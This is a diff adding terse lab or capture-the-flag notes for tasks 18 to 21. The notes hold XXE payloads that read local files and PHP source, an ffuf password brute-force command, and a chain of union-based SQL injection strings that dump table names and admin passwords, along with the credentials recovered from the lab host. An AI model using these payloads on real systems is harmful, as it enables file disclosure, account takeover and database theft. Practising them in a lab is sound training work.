@@ -1,0 +1,69 @@
+XXE
+task 18
+Burp change method to POST
+
+<?xml version="1.0"?>
+<!DOCTYPE title [<!ENTITY sp SYSTEM "flag.txt"> ]>
+<title>&sp;</title>
+
+task 19
+
+ffuf -u http://10.8.32.1:42792 -X POST -d "lusername=princess&password=FUZZ&submit=+Login+" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt:FUZZ --fs 1074
+princess babygirl
+
+upload:
+
+<?xml version="1.0"?>
+<!DOCTYPE title [<!ENTITY sp SYSTEM "flag.txt"> ]>
+<order>
+        <item>
+                <name>&sp;</name>
+                <amount>1</amount>
+        </item>
+</order>
+
+task 20
+
+from html source:
+$.ajax({
+        type: "POST",
+        url: "doLogin.php"
+
+<!DOCTYPE username [<!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"> ]>
+<user>
+<username>&sp;</username>
+<password>password1</password></user>
+
+
+task 21
+
+in paassword ' or 1=1#
+login=nmnm&passwd=' or 1=1 union select TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where table_schema=database()#&submit=enter
+
+users
+
+login=nmnm&passwd=' or 1=1 union select column_name from information_schema.columns where table_schema=database()#&submit=enter
+
+user_id
+user_login
+user_password
+user_admin
+
+login=nmnm&passwd=' or 1=1 union select user_admin from users #&submit=enter
+
+login=nmnm&passwd=' or 1=1 union select user_id from users  where user_id=1 #&submit=enter
+
+login=nmnm&passwd=' or 1=1 union select user_password from users  where user_admin=1 #&submit=enter
+
+atum
+atum_was_here;)
+
+http://10.8.32.1:42795/74109a603d32db22897b36e7decabcb6.php
+
+<!DOCTYPE object [<!ENTITY sp SYSTEM "kronos.txt"> ]>
+<all>
+<object>&sp;</object>
+<task>task</task>
+</all>
+
+
